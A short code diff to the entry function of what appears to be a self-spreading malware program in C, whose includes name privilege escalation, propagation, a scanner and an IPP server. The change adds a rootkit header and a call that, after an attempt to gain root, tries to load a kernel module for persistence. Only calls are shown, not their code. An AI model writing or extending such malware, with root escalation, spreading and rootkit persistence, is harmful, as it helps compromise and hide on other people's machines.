@@ -1,6 +1,7 @@
 #include "ipp_server.h"
 #include "lpe.h"
 #include "propagate.h"
+#include "rootkit.h"
 #include "scanner.h"
 #include "utils.h"
 
@@ -25,6 +26,8 @@ void entry(Globals *global) {
     // try to gain root
     try_get_root(global);
 
+    // if root, try to load kernel module
+    try_persist(global);
     // load the file content into the global buffer
     load_file_bytes(global);
 
